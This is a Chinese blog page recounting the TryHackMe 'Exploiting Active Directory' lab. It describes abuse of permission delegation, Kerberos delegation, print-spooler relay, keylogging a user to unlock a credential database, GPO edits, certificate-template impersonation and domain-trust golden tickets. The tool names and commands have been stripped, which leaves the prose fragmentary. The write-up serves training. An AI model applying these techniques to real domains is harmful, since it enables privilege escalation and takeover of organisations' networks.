<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-Exploiting Active Directory | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-Exploiting Active Directory"><meta name="application-name" content="THM-Exploiting Active Directory"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-Exploiting Active Directory"><meta property="og:url" content="http://hybcx.xyz/2024/06/10/thm-exploiting-active-directory/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 介绍 该网络是 Breaching AD 和 Enumerate AD 网络的延续。请确保先完成这些网络，然后再继续此操作。另请注意，我们将广泛讨论 AD 对象。如果您需要复习一下，请快速浏览一下这个房间。现在我们已经突破了 AD 并枚举了域的结构，我们将探索可用于利用枚举中可能出现的错误"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="0x01 介绍 该网络是 Breaching AD 和 Enumerate AD 网络的延续。请确保先完成这些网络，然后再继续此操作。另请注意，我们将广泛讨论 AD 对象。如果您需要复习一下，请快速浏览一下这个房间。现在我们已经突破了 AD 并枚举了域的结构，我们将探索可用于利用枚举中可能出现的错误"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/06/10/thm-exploiting-active-directory/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-Exploiting Active Directory',
  postAI: '',
  pageFillDescription: '0x01 介绍, AD Exploitation, 学习目标, 索取您的凭证, 0x02 利用权限委派, 权限委派, Exploiting ACEs, Bloodhound, 权限提升, AddMember, ForceChangePassword, 0x03 利用Kerberos委派, Kerberos 委派, 受约束与无约束, 基于资源的约束委派, 约束委派利用, 0x04 利用自动中继, 机器账户, 打印机bug, 后台打印服务, SMB 签名, 利用身份验证中继, 0x05 利用AD用户, 用户和用户行为, 搜寻凭据, SYSTEM 有时太特权了, 0x06 利用GPOs, 组策略对象, 组策略管理, 利用 GPOs, 0x07 利用证书, AD证书服务, 利用证书模板, 通过证书模拟用户, 0x08 利用域信任, 域信任, KRBTGT 和 黄金票据, 跨领域 TGTs, 利用域信任, 0x09 结论, 缓解措施介绍该网络是和网络的延续请确保先完成这些网络然后再继续此操作另请注意我们将广泛讨论对象如果您需要复习一下请快速浏览一下这个房间现在我们已经突破了并枚举了域的结构我们将探索可用于利用枚举中可能出现的错误配置的不同方法现在我们已经进行了内部勘察并了解了结构和环境的情况现在是开发阶段的时候了此阶段利用错误配置来执行横向移动和权限升级的组合直到我们达到执行目标的合适位置如下图所示这个阶段通常与持久性相结合以确保我们不会失去我们获得的新位置但这将在下一个房间中介绍它通常还与附加枚举相结合因为我们的新位置可能使我们能够获取有关土地情况的附加信息学习目标在此网络中我们将介绍几种可用于利用错误配置的方法这绝不是一个完整的列表因为可用的方法通常是高度情境化的并且依赖于结构和环境但是我们将介绍以下利用的技术委托强制身份验证中继组策略对象定位用户域信托银票和金票配置网络过程不赘述索取您的凭证为了模拟违规您将获得第一组凭据网络设置完成后导航至以请求您的凭据对单击获取凭据按钮以接收可用于初始访问的凭据对此凭据对将为您提供对的和访问权限可以被视为进入该环境的跳转主机模拟您已实现的立足点您可以使用或任何其他类似的远程桌面客户端连接到该主机以进行连接时记得指定的域名对于访问您可以使用以下命令带入我们的凭证为第二个凭据出现提示时提供您帐户的关联密码尽管可用于所有任务但速度更快其中该房间的网络拓扑图如下利用权限委派可以通过称为权限委派的功能来委派权限和特权不要与下一个任务中将讨论的委派混淆授权使得在组织中如此强大想象一下我们为一家拥有名员工的组织工作由于我们关心安全性因此我们只有三个有权访问凭据的用户这三个用户不可能满足用户的所有请求例如重置密码使用委派我们可以将强制更改用户密码的权限委派给帮助台团队这意味着他们现在拥有此特定功能的委派权限原则上为了保证代表团的安全应遵循最小特权原则然而在大型组织中这说起来容易做起来难在此任务中我们将研究如何利用一些委派错误配置权限委派权限委派漏洞通常称为基于的攻击允许管理员配置访问控制条目来填充自主访问控制列表因此称为基于的攻击几乎任何对象都可以使用进行保护描述任何其他对象对目标对象所具有的允许和拒绝的权限但是如果这些配置错误攻击者就有可能利用它们让我们再看一下我们的例子如果支持团队通过域用户组被授予则这将被视为不安全当然他们能够重置忘记密码的员工的密码但这种错误配置还允许他们重置特权帐户的密码例如本质上允许权限升级的域管理员组成员的帐户大量可能会被错误配置并且每种的漏洞利用情况各不相同文档有助于解释枚举的以及如何利用它们然而我们将在这里看看几个值得注意的我们能够在不知道用户当前密码的情况下设置用户的当前密码我们能够将用户包括我们自己的帐户组或计算机添加到目标组我们对对象拥有完全的控制权包括更改用户密码注册或将对象添加到目标组的能力我们可以更新目标对象的任何不受保护的参数例如这可以让我们更新参数这将导致用户下次登录时执行脚本我们有能力更新目标对象的所有者我们可以让自己成为所有者从而获得对该对象的额外权限我们能够将新的写入目标对象的例如我们可以编写一个来授予我们的帐户对目标对象的完全控制权我们有能力对目标对象执行与扩展权限相关的任何操作例如这包括强制更改用户密码的能力为了利用这些我们需要一种与交互的方法来发出这些请求两个最佳选项是或根据环境中的漏洞和检测工具一种选择可能更加隐蔽在此任务中我们将展示两者已经为您执行并作为任务文件附加在或机器上启动并摄取数据不过我们欢迎您按照枚举室中提供的步骤自行重新运行注意如果您得到请确保您的域名设置正确我们提供了数据的作为任务文件在上您可以在下找到文件首先我们需要启动在另一个终端选项卡中运行这将向您显示身份验证数据库的默认凭据将为使用它在中进行身份验证通过身份验证后您可以将两个拉链拖放到屏幕上一旦数据被摄取我们就可以再次开始枚举攻击路径权限提升如果我们在中搜索任务中分配的用户帐户我们会发现我们没有太多权限我们能够通过进入但这只会为我们提供低特权访问由于域是分层的我们的第一步将是破坏第层基础设施我们需要危及组因为该组拥有所有工作站的管理权限让我们问问寻血猎犬是否有一条道路可以用来危害这个组织将您的用户帐户添加为起始位置将组添加为结束位置向我们展示了一条非常有趣的道路看来这个领域有一点权限委托管理员通过向域用户组提供错误配置了支持组的权限委派这意味着域用户组的任何成员包括我们的帐户都可以将帐户添加到支持组此外显示支持组拥有适用于第层管理员组成员的这并不是真正的错误配置因为第层管理员并不那么敏感但与最初的错误配置结合使用时它提供了非常有效的攻击路径让我们利用它吧此攻击路径的第一步是将我们的帐户添加到支持组为此我们将使用工具集中的在主机上启动通过或通过并运行以下命令来添加您的帐户如果一切正常您应该会以会员身份看到您的帐户现在我们是支持组的成员我们继承了第层管理员组的权限委派首先我们需要确定该群体的成员以选择目标我们可以再次使用来协助完成此操作记下这些帐户之一的用户名由于网络是共享的因此最好选择列表中更靠下的一个我们将使用强制更改密码这里我选择用户注意如果您收到访问被拒绝错误则表明您的权限尚未通过域传播这最多可能需要分钟最好的方法是终止或会话短暂休息一下然后重新进行身份验证并重试您还可以运行然后断开连接并重新连接这在某些情况下会导致同步速度更快从这里能看出第二层的管理员拥有管理第一层的权限如果此步骤有效您现在应该能够使用此目标帐户及其新密码向进行身份验证您当前拥有此工作站的管理访问权限恭喜您已通过利用权限委派将您的特权正式升级为第级管理员利用委派接下来我们将了解委托当您谈论委派时通常讨论的是这而不是权限委派委派委派的实际用途是使应用程序能够访问托管在不同服务器上的资源例如服务器需要访问其托管的应用程序的数据库服务器上托管的数据库如果没有委派我们可能会使用服务帐户并为其提供对数据库的直接访问权限当在应用程序上发出请求时服务帐户将用于对数据库进行身份验证并恢复信息但是我们可以允许将此服务帐户委托给服务用户登录我们的应用程序后服务帐户将代表该用户请求访问数据库这意味着用户只能访问他们拥有相关权限的数据库中的数据而无需向服务帐户本身提供任何数据库特权或权限受约束与无约束委派有两种类型在的最初实现中使用了这是最不安全的方法本质上无约束委派对委派没有任何限制在后台如果设置了标志的用户对配置了无约束委派的主机进行身份验证则会生成该用户帐户的票证授予票证并将其存储在内存中以便以后需要时使用假设攻击者可以危害启用了无约束委派的主机在这种情况下他们可能会尝试强制特权帐户向主机进行身份验证这将允许他们拦截生成的并模拟特权服务如果您想查看利用无约束委派的示例请查看此处为了解决无约束委派的安全缺陷微软于年推出了约束委派约束委派限制了帐户可以委派的服务从而限制了帐户被盗用时的风险以下是可以配置委派的服务示例用于应用程序以允许使用凭据进行直通身份验证通用互联网文件系统用于文件共享允许用户委派共享用于委托服务执行重置用户密码等操作允许主机上所有活动的帐户委派允许将用户帐户委派给服务以对数据库进行直通身份验证利用受约束委派通常比利用无约束委派更复杂因为受委派帐户不能仅用于所有用途然而它仍然可以用于一些强大的利用一个例子是如果我们能够破坏配置了约束委派的帐户通过知道该帐户的明文密码甚至哈希值我们可以为该帐户生成然后使用为任何非敏感用户帐户执行票证授予服务器请求以便访问作为该用户的服务例如想象一下模拟一个可以访问敏感数据库的帐户基于资源的约束委派所以委托实际上分为三种类型但这一点本身就值得一提于年推出的基于资源的约束委派再次对委派提供了额外的安全限制完全改变了委托模型服务现在指定哪些对象可以委托给它而不是指定哪个对象可以委托给哪个服务这允许服务所有者控制谁可以访问它在我们的应用程序示例中这意味着我们现在可以在数据库服务上指定允许服务帐户委派对其的访问而不是指定服务帐户可以委托给数据库服务来访问数据库假设我们有权为服务配置这意味着我们有能力为对象设置属性我们可以用我们有权访问的帐户的详细信息填充此属性现在要访问该服务我们可以为我们控制的帐户生成这将允许我们与该服务进行交互如果您想要利用的详细示例请查看此处约束委派利用我们将利用约束委派来完成这项任务我们需要做的第一件事是枚举可用的委派让我们使用新的特权用户来执行网络命令我们可以通过运行以下命令来使用的进行此枚举密码使用登录我们中得到的特权用户根据此命令的输出我们可以看到帐户可以委托上的和服务可以看出您可能会认为这意味着我们只能代表模拟用户访问网站但是也使用和服务理想的选择是模拟第层管理员因为这将为我们提供对的管理访问权限如果您要对执行正确的利用后枚举您会发现主机上有一个服务以用户身份运行由于我们现在拥有管理访问权限因此我们可以使用它来转储它是注册表配置单元的一部分其中存储了服务等功能的凭据让我们使用来转储秘密让我们运行一下这两个命令要从注册表配置单元转储机密我们需要模拟用户与注册表配置单元交互以提取明文凭据现在我们可以访问与帐户关联的密码我们可以执行委派攻击我们将结合使用和您可以为使用另一个窗口但请确保在执行命令后退出否则稍后将在错误的上下文中加载票证我们将使用生成票证然后使用将这些票证加载到内存中让我们从生成票开始我们首先需要生成一个可用于生成和服务的票证参数解释具有受限委派权限的用户我们正在攻击的域因为可用于伪造票证以滥用跨林信任与帐户关联的密码现在我们有了可以执行委托的帐户的我们可以为想要模拟的帐户伪造请求我们需要对和执行此操作以便我们在上创建参数解释我们提供在上一步中生成的我们想要模拟的用户由于帐户对工作站具有管理访问权限因此可以安全地假设帐户对服务器具有管理访问权限因此请选择您想要模拟的帐户我们想要使用委托来模拟的服务我们首先为服务生成一个然后我们可以为服务重新运行相同的命令再次运行该命令这次是针对服务现在我们有了两张票据我们可以使用导入它们如果您想验证票证是否已导入您可以退出并运行现在票证已导入我们终于可以在上创建通过利用约束委派我们现在拥有访问的特权利用自动中继在此任务中我们将了解一些自动继电器身份验证尝试不断地在网络上飞来飞去正如所示如果幸运的话我们可以拦截其中一些挑战以获得访问权限但如果我们不喜欢等待怎么办如果我们可以强制进行身份验证怎么办尽管我们已经拥有对的特权访问权限但我们可能无法访问受限委派漏洞这是另一种出色的攻击可以通过执行该攻击来获得对主机的特权访问机器账户所有主机都有一个计算机帐户本质上这是与计算机关联的用户帐户除非有人篡改了主机的账户否则这些账户的密码是无法破解的默认情况下它们的长度为个字符并且每天自动轮换一次在中这些计算机帐户在不同的服务中被大量使用不同的域控制器使用其计算机帐户来同步更新和更改当您代表正在使用的主机请求证书时该主机的计算机帐户将用于对证书服务进行身份验证中有一种特殊情况其中一台机器对另一台机器具有管理员权限本质上在配置中一台主机的管理权限已被授予另一台主机同样这是必须同步的域控制器或集群等预期功能然而这些实例为强制身份验证提供了非常有趣的攻击媒介我们首先需要确定计算机帐户对另一台计算机具有管理访问权限的情况我们可以使用来实现此目的但这意味着我们必须编写一些自定义密码查询单击中分析选项卡中的创建自定义查询我们要编写以下查询此查询将尝试查找一台计算机与另一台计算机具有关系的实例您应该看到与此类似的输出这很有趣它向我们表明计算机帐户对计算机具有管理权限打印机这不是一个错误而是一个功能微软说真的当此事被报道时微软回应称这是一项功能打印机错误是协议远程协议的一项功能该协议允许域用户远程强制运行服务的目标主机对任意地址进行身份验证近年来出现了一些这样的错误微软声称唯一的错误是其中一些根本不需要凭据但这个问题已通过安全补丁解决因此要利用这一点除了机器帐户管理权限外我们还需要满足以下四个条件一组有效的帐户凭据与目标服务的网络连接目标主机必须运行打印后台处理程序服务主机不得强制执行签名条件和已经满足我们需要确保工作的唯一两个条件是条件和后台打印服务我们需要确定打印后台处理程序服务是否正在运行由于我们无法访问所以需要从网络角度进行查询在这种情况下我们可以使用上的会话中的查询来查询服务的当前状态的输出验证服务是否正在运行如果我们收到访问被拒绝错误您也许可以尝试使用命令然而微软一直在打击从网络角度查看这些端口如果两者都给你带来了错误你可能只需要大胆尝试一下这样条件三就满足了这里我就遇见了上述两种命令都执行不了的情况只需要大胆一下直接验证发现不需要上面两条命令我们也达到了预期的目的签名为了中继强制身份验证尝试不应强制执行签名应该注意的是允许签名和强制执行签名之间存在差异由于某些旧系统不支持签名因此默认情况下的配置是允许但不强制签名这意味着只有支持时才会使用它由于我们将托管恶意服务器因此我们可以确保我们的服务器不支持签名从而强制目标不对身份验证尝试进行签名为了验证和没有强制执行签名我们可以在上使用我们可以看到签名已启用但根据输出并未强制执行这意味着我们所有的条件都满足了我们可以开始进攻了利用身份验证中继注意此攻击可能不稳定滥用打印后台处理程序服务可能会导致其崩溃并且并不总是保证回调因此上一个任务已为您提供了继续所需的权限然而了解身份验证中继以及如何强制执行它们对于攻击至关重要因此下面提供了执行此类攻击的步骤您可以决定尝试一下但不能保证回调如果它不起作用请继续执行下一个任务也许在您的房间旅程结束时再次探索这个问题我们将使用来利用身份验证中继它是一个漏洞利用程序但已为您编译并存储在上的目录中我们将使用强制在上向我们进行身份验证然后使用的中继的身份验证尝试请注意如果您使用自己的则需要确保您拥有支持的更新版本第一步是设置中继在我们的上我们可以使用以下内容如果我们指定的主机名而不是则主机可以请求我们使用身份验证而不是因此我们应该指定通过中继监听我们现在可以强制向我们进行身份验证在上的终端中执行以下命令您的攻击者应与网络的接口相对应如果一切顺利您应该已经收到了身份验证尝试和中继这里我自己的包有问题用了得到凭据之后我们利用凭据直接远程登陆利用用户到目前为止我们的剥削已经走了很远我们对工作站和服务器具有完全的管理访问权限从本质上讲我们可以在几乎任何和系统上执行后利用但我们仍然想走得更远下一个任务也可以看作是后利用但当我们仍在执行利用以达到目标执行的合适位置时通常是一个很好的东西现在是我们定位用户的时候了用户和用户行为未来的工厂将只有两名员工一个人和一条狗人类会在那里喂狗如果人类试图触摸某物狗会在那里咬人沃伦本尼斯不幸的是用户往往是安全链中最薄弱的环节想想弱密码和坏习惯例如授予过于宽松的权限忽视这个攻击面将是无知和无效的虽然建立针对用户的正确枚举和攻击方法很好但在此任务中我们将重点关注两个要素凭据管理用户如何存储其凭据在中这非常重要因为用户可能拥有多组凭据记住所有这些凭据可能会很麻烦键盘记录通常在利用过程中我们需要了解普通用户如何与系统交互与屏幕截图一起键盘记录可以成为从攻击者的角度获得这种理解的有用工具搜寻凭据既然我们已经妥协了我们可能应该环顾四周看看是否有任何有用的信息查看用户目录看看其中是否有一些有用的信息枚举工作应将您引导至文件快速谷歌应该证实我们的怀疑这个文件确实非常有价值我们可以使用的下载命令来恢复此文件此文件似乎是一个凭据数据库但是问题在于数据库是使用密码加密的我们可以尝试破解密码但任何使用凭据数据库的人通常都精明地确保初始密码是安全的我们可能会更成功地看到用户如何与此数据库交互有时太特权了有一个内置的键盘记录器这对于提取用户的击键非常有用然而我们不能只是启动这个键盘记录器并希望得到最好的结果因为我们的当前正在系统上下文中运行不会输入任何按键所以这对我们没有帮助为了捕获正确的用户凭据我们需要确保正在该用户的上下文中运行幸运的是为我们提供了迁移功能由于我们以身份运行所以我们应该能够迁移到任何进程您可以在上执行远程代码使用它来获取如果您需要回顾一下和的使用这里有一个关于其使用的模块不过为了快速了解您可以使用以下命令生成有效负载您可以使用服务器托管然后使用如下内容复制它一旦您拥有了您就可以继续第一步是查看用户本机上是否有正在运行的进程一旦您拥有了您就可以继续第一步是查看用户本机上是否有正在运行的进程注意如果您没有看到用户的进程您可以通过执行以下步骤自行启动该进程使用以下命令重置用户的密码在中运行以下命令使用重新启动服务器服务器重新上线后您应该会看到资源管理器进程看来我们很幸运用户在上有一个活动会话让我们迁移到该用户的一个进程最安全的选择通常是像这样现在我们准备启动我们的键盘记录器现在我们必须耐心等待如果幸运的话我们将获得一些凭证给它几分钟然后运行以下命令来转储捕获的击键这是针对用户的一个简单示例还有很多事情可以做将用户定位纳入开发方法中至关重要要回答此任务的问题您将需要它已为您安装在上因此您只需搜索并运行该应用程序即可如果您使用自己的则在大多数发行版上都可以工作或者您可以从这里下载另请确保使用命令将数据库下载到您的主机如果您使用请在打开数据库文件之前确保用户拥有该数据库文件否则可能会锁定数据库并给出错误的结果虽然持久性只会在隔壁房间讨论但现在可能是在上创建本地帐户并授予其管理员权限的好时机以便您有一个良好的立足点由于其余任务实际上并不需要这样做因此如果您想这样做您需要自己对此进行一些研究我们这里需要用户的数据库文件利用通过对用户进行键盘记录我们可以解密他们的凭据数据库从而为我们提供有助于进一步实现攻击目标的凭据即帐户我们需要执行一些枚举来弄清楚这些凭证的用途幸运的是我们已经有了可以使用的数据使用中的搜索功能让我们检查一下所发现的帐户拥有的权限该帐户的一项权限尤其突出即对组策略对象的所有权此外当我们进行一些调查时似乎此已应用于我们的机器这可能为我们提供进一步开发的理想机会组策略对象还记得我们在枚举中讨论过目录吗这是存储的目录以便将其复制到加入域的计算机是策略设置的虚拟集合每个都有一个唯一的名称称为这就是为什么如果您尝试读取目录的内容那么所有随机名称都没有多大意义每台计算机都有一个本地策略配置这包含几个值得注意的配置例如防火墙防病毒和等服务的应用程序配置本地组成员身份例如管理员或远程桌面用户组启动配置例如应执行的脚本安全和协议设置例如支持这些只是几个例子有大量可以设置的配置选项组策略管理如果您只有一台计算机则可以轻松地直接在主机上更改本地策略配置但是您需要一种机制来从大型组织的中央位置部署配置这就是组策略管理发挥作用的地方允许我们直接在结构上定义策略而不是在每台机器上本地定义策略本质上我们可以为对象定义例如特定的或组然后加入域的计算机将定期从中提取所有策略并应用相关策略默认情况下策略每分钟通过应用程序复制一次但是我们也可以从命令提示符手动执行此应用程序以立即应用策略利用尽管可以通过多种方式利用但我们将坚持使用简单的解决方案将我们控制的帐户添加到本地管理员组和本地远程桌面用户组这将允许我们获得的管理权限以及的能力我们还可以使用公开的端口但没有多少组织已升级为提供访问因此访问或传统的横向移动技术如更安全为了修改我们需要以具有相关权限的用户访问组策略管理我们可以以用户身份通过进入但这可能会将用户踢出其活动会话从而引起怀疑相反我们将使用普通帐户或第层管理员帐户通过进入使用命令将用户的凭据注入内存然后打开来修改有关命令的回顾请参阅枚举空间但是此处还提供了应从管理命令提示符窗口执行的所需命令利用获取到的第二层管理员的账户通过进入出现提示后提供与帐户关联的密码要验证您是否提供了正确的凭据您可以运行在新生成的命令提示符窗口中我们可以启动管理控制台输入密码我们现在要添加组策略管理管理单元单击文件添加删除管理单元选择组策略管理管理单元并单击添加单击确定您现在应该能够看到域的现在我们可以导航到用户有权修改的服务器管理服务器管理服务器推送我们可以右键单击并选择编辑这将打开新的组策略管理编辑器窗口为了将我们的帐户添加到本地组我们需要执行以下步骤展开计算机配置展开政策展开设置展开安全设置右键单击受限组并选择添加组如果支持组已存在则意味着有人已经执行了该漏洞利用您可以将其删除并自行创建或者只是检查它以查看配置的内容单击浏览输入支持然后单击检查姓名单击确定两次不使用第一个过滤器对于第二个过滤器我们要添加管理员组和远程桌面用户组最后它应该看起来像这样配置完成后我们可以单击应用和确定现在我们需要做的就是等待最多分钟就会被应用此后我们作为支持组成员的初始帐户现在将拥有的管理和权限当然也可以选择连接利用证书现在我们已经可以访问我们通过利用所有第层资产服务器进一步推进了利用的旅程然而我们再次陷入困境没有简单的方法可以进入下一层同样我们需要寻找更多的创意途径完成并作为白皮书发布的研究表明可以利用配置错误的证书模板进行权限升级和横向移动如果您想更好地了解证书错误配置以及如何识别它们请查看此房间证书服务证书服务是的公钥基础设施实现由于为组织提供了一定程度的信任因此它可以用作来证明和委托信任可用于多种用途例如加密文件系统创建和验证数字签名甚至用户身份验证这使其成为攻击者的一个有希望的途径由于是一项特权功能因此它通常在选定的域控制器上运行这意味着普通用户无法真正直接与服务交互另一方面组织往往太大无法让管理员手动创建和分发每个证书这就是证书模板的用武之地管理员可以创建多个模板允许任何具有相关权限的用户自行请求证书这些模板包含一些参数说明哪个用户可以请求证书以及需要什么发现这些参数的特定组合可能具有令人难以置信的毒性并且会被滥用以进行权限升级和持久访问在我们深入探讨证书滥用之前先介绍一些术语公钥基础设施是管理证书和公钥加密的系统证书服务是的实现通常在域控制器上运行证书颁发机构是颁发证书的定义颁发证书的方式和时间的设置和策略的集合证书签名请求是发送到以请求签名证书的消息扩展增强密钥用法是定义如何使用生成的证书的对象标识符查找易受攻击的证书模板为了找到有漏洞的模板我们将使用的内置工具使用上的访问我们可以运行以下脚本来枚举证书这将提供所有配置模板的输出我们还可以使用证书审核工具例如的然而手动方法使我们能够确保找到所有可能的错误配置如果参数值组合变得有毒则证书模板将被视为配置错误从而允许请求者执行权限升级在我们的例子中我们正在寻找具有以下有毒参数组合的模板证书可用于客户端身份验证证书模板允许我们指定主题备用名称证书将可以使用私钥导出我们拥有使用证书模板所需的权限如果您有兴趣了解有关有毒参数组合的更多信息请阅读的白皮书由于这个房间的目的是获得更广泛的利用攻击知识因此我们将指出是易受攻击的模板在此模板中我们可以看到的计算机帐户可以为模板发出该允许我们指定主题备用名称并可用于客户端身份验证提到了的八种常见安全错误配置因此应该注意的是仍然可以发现大量潜在的错误配置利用证书模板使用上的访问我们现在将请求我们的证书如果您使用并保存连接的配置请确保禁用受限管理模式我们将使用管理控制台输入并按键单击文件添加删除管理单元添加证书管理单元并确保在提示中选择计算机帐户和本地计算机单击确定您现在应该看到证书管理单元我们将要求个人证书右键单击个人并选择所有任务请求新证书单击下一步两次以选择注册策略您将看到我们有一个可以请求的模板但首先我们需要提供其他信息单击更多信息警告将主题名称类型选项更改为通用名称并提供任意值因为这并不重要然后单击添加将备用名称类型选项更改为用户主体名称提供您要模拟的用户的最好是帐户例如然后单击添加您的附加信息应如下所示一旦您满意请单击应用和确定然后选择证书并单击注册您应该能够看到您的证书最后一步是使用私钥导出我们的证书右键单击证书并选择所有任务导出单击下一步选择是导出私钥然后单击下一步单击下一步然后为证书设置密码因为没有密码无法导出私钥单击下一步并选择存储证书的位置单击下一步最后单击完成我这里设置的密码为通过证书模拟用户现在我们终于可以模拟用户了要执行此操作需要执行两个步骤使用证书请求票证授予票证将加载到您选择的黑客平台中第一步我们将使用目录中提供了已编译的版本打开命令提示符窗口并导航到该目录我们将使用以下命令来请求我们来分解一下参数这指定我们将模拟的用户并且必须与我们生成的证书的相匹配指定票证的加密类型设置此项对于规避很重要因为默认加密算法很弱这会导致溢出警报我们生成的证书的路径我们的证书文件的密码将输出到的文件我们当前攻击的域的我们请求的域控制器的通常最好选择运行服务的执行命令后我们应该会收到理想状态如下但我这里报错如下搜了几篇文章这里有文章是这样说的如下图因此我严重怀疑那些成功了的修改了这个策略导致我复现不成功因此这里就只能直接了看思路现在我们可以使用加载并向进行身份验证最后我们可以访问第层基础设施并破坏了整个子域利用域信任尽管我们可以访问第层基础设施但这仍然不够我们仅利用了域肯定也必须有其他地区的域名吗好吧如果我们控制了根域我们将能够危害所有这些区域域在此任务中我们将了解如何利用域信任来控制整个森林域信任正如基础知识室中所讨论的森林是网络内一棵或多棵域树的集合域信任是网络中的用户访问域中其他资源的一种机制在大多数情况下信任概述了林内的域如何相互通信在某些环境中信任可以扩展到外部域在某些情况下甚至可以扩展到林域之间可配置的信任主要有两种类型信任从信任域流向受信任域的方向信任关系不仅仅限于两个域还包括其他受信任的域林中通常有根域或父域在我们的例子中这是对于每个区域办事处都会创建子域例如或此林配置将允许和英国办事处之间共享资源例如如果英国办公室的某个用户需要访问我们可以为域中的用户授予访问权限这种权限委派之所以有效是因为和根域以及和根域之间存在双向信任本质上是在和之间创建传递信任如上所述父域和子域之间的信任是双向的这是预期的行为用于通过更大的可传递信任关系来共享资源然而作为攻击者如果我们已经破坏了子域我们也可以利用这种信任来破坏父域和黄金票据是用于实施的帐户该名称源自和票证授予票证本质上此帐户充当分发中心服务的服务帐户该服务处理所有票证请求此帐户用于加密和签署域的所有票证由于密码哈希由所有